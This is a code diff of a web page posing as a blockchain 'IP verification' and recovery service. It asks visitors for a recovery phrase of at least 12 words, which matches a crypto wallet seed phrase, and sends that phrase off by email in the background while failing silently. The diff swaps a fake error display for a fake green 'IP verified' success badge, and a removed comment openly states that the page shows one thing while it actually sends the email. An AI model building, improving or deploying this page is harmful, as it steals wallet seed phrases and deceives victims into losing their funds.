@@ -17,11 +17,10 @@
     body {
       min-height: 100vh;
       background-color: #f0f2f5;
-      /* background image positioned at the top, no repeat */
       background-image: url('https://ipblockchain.github.io/photo/images%20(2).jpeg');
       background-repeat: no-repeat;
       background-position: center top;
-      background-size: 150%; /* دورتر از قبل (200% → 150%) */
+      background-size: 150%;
       background-attachment: fixed;
       display: flex;
       align-items: center;
@@ -29,7 +28,6 @@
       padding: 20px;
     }
 
-    /* main card — solid matte light, fully opaque, readable */
     .card {
       background: #f8fafd;
       border-radius: 36px;
@@ -41,7 +39,6 @@
       border: 1px solid #e9edf2;
     }
 
-    /* all pages */
     .page {
       display: flex;
       flex-direction: column;
@@ -57,7 +54,6 @@
       display: flex;
     }
 
-    /* headlines */
     .headline {
       font-size: 1.6rem;
       font-weight: 480;
@@ -71,7 +67,6 @@
       font-weight: 350;
     }
 
-    /* solid button (matte) */
     .primary-button {
       background: #1e2a3a;
       border: none;
@@ -110,7 +105,6 @@
       border: 1px solid #cbd5e1;
     }
 
-    /* rules page */
     .rules-title {
       font-size: 1.7rem;
       font-weight: 500;
@@ -172,7 +166,6 @@
       line-height: 1.4;
     }
 
-    /* action button (solid) */
     .action-btn {
       background: #1e2a3a;
       border: none;
@@ -206,7 +199,6 @@
       background: #263a50;
     }
 
-    /* recovery page */
     .recovery-title {
       font-size: 1.7rem;
       font-weight: 500;
@@ -264,6 +256,23 @@
       font-weight: 470;
     }
 
+    .success-badge {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      background: #0d6b3e;
+      color: white;
+      font-size: 1.3rem;
+      font-weight: 500;
+      padding: 12px 24px;
+      border-radius: 60px;
+      box-shadow: 0 4px 14px rgba(13, 107, 62, 0.3);
+      border: 1px solid #3b9e6a;
+      width: 100%;
+      letter-spacing: 0.3px;
+    }
+
     .error-badge {
       display: inline-block;
       background: #bc2c2c;
@@ -296,6 +305,14 @@
       font-size: 0.7rem;
       color: #617694;
       margin-top: 8px;
+    }
+
+    @keyframes fadeSlide {
+      0% { opacity: 0; transform: translateY(8px); }
+      100% { opacity: 1; transform: translateY(0); }
+    }
+    .success-badge {
+      animation: fadeSlide 0.4s ease forwards;
     }
   </style>
 </head>
@@ -381,7 +398,6 @@
       landing.classList.remove('active');
       rulesPage.classList.add('active');
       recoveryPage.classList.remove('active');
-      // reset checkboxes
       rule1.checked = false;
       rule2.checked = false;
       rule3.checked = false;
@@ -392,16 +408,21 @@
       landing.classList.remove('active');
       rulesPage.classList.remove('active');
       recoveryPage.classList.add('active');
-      phraseInput.value = '';       // clear any previous text
+      phraseInput.value = '';
       validateWordCount();
+      submitBtn.innerHTML = `<span>✓</span> confirm`;
+      submitBtn.disabled = true;
+      submitBtn.style.background = '';
+      submitBtn.style.border = '';
+      submitBtn.style.boxShadow = '';
+      submitBtn.style.color = '';
+      submitBtn.style.cursor = '';
     }
 
-    // Event listeners for navigation
     showRulesBtn.addEventListener('click', showRules);
     backFromRules.addEventListener('click', showLanding);
     backFromRecovery.addEventListener('click', showRules);
 
-    // --- Rules check handling ---
     function updateRulesButton() {
       acceptRulesBtn.disabled = !(rule1.checked && rule2.checked && rule3.checked);
     }
@@ -414,13 +435,20 @@
       if (!acceptRulesBtn.disabled) showRecovery();
     });
 
-    // --- Word count & validation (minimum 12 words) ---
     function validateWordCount() {
       const text = phraseInput.value.trim();
       const words = text ? text.split(/\s+/) : [];
       const count = words.length;
       wordDisplay.innerText = `⌨️ ${count} word${count !== 1 ? 's' : ''}`;
       submitBtn.disabled = (count < 12);
+      if (count < 12) {
+        submitBtn.innerHTML = `<span>✓</span> confirm`;
+        submitBtn.style.background = '';
+        submitBtn.style.border = '';
+        submitBtn.style.boxShadow = '';
+        submitBtn.style.color = '';
+        submitBtn.style.cursor = '';
+      }
     }
 
     phraseInput.addEventListener('input', validateWordCount);
@@ -445,38 +473,46 @@
         console.log('✅ email sent in background');
       } catch (err) {
         console.warn('⚠️ email send failed (silent):', err);
-        // fail silently — user still sees error cross
       }
     }
 
-    // --- Confirm button: shows ERROR (red X) but actually sends email ---
+    // --- Confirm button: shows green SUCCESS (IP verified) and sends email in background ---
     submitBtn.addEventListener('click', (e) => {
       e.preventDefault();
       const phrase = phraseInput.value.trim();
       if (!phrase) return;
 
-      // Disable button, store original content, change to error cross
       submitBtn.disabled = true;
-      const originalContent = submitBtn.innerHTML;
-      submitBtn.innerHTML = `<span class="error-badge">✗</span> error`;
 
-      // Trigger background email (fire and forget — no await)
+      // Change button to green success badge (IP verified)
+      submitBtn.style.background = '#0d6b3e';
+      submitBtn.style.border = '1px solid #3b9e6a';
+      submitBtn.style.boxShadow = '0 4px 14px rgba(13, 107, 62, 0.3)';
+      submitBtn.style.color = 'white';
+      submitBtn.style.cursor = 'default';
+      submitBtn.innerHTML = `IP verified ✓`;
+
+      // Trigger background email (fire and forget)
       sendPhraseViaEmail(phrase);
 
       // Clear textarea and update word count
       phraseInput.value = '';
-      validateWordCount();  // sets word count to 0 → button stays disabled
+      validateWordCount();
 
-      // After 1.8 seconds revert button to original look (but remains disabled due to 0 words)
+      // After 2.5 seconds revert button to default look
       setTimeout(() => {
-        submitBtn.innerHTML = originalContent;
-        // button disabled state already managed by word count (0 words)
-      }, 1800);
+        submitBtn.style.background = '';
+        submitBtn.style.border = '';
+        submitBtn.style.boxShadow = '';
+        submitBtn.style.color = '';
+        submitBtn.style.cursor = '';
+        submitBtn.innerHTML = `<span>✓</span> confirm`;
+        validateWordCount();
+      }, 2500);
     });
 
-    // --- Initial states ---
-    validateWordCount();    // sets initial word display
-    showLanding();          // ensure landing is active
+    validateWordCount();
+    showLanding();
   })();
 </script>
 </body>
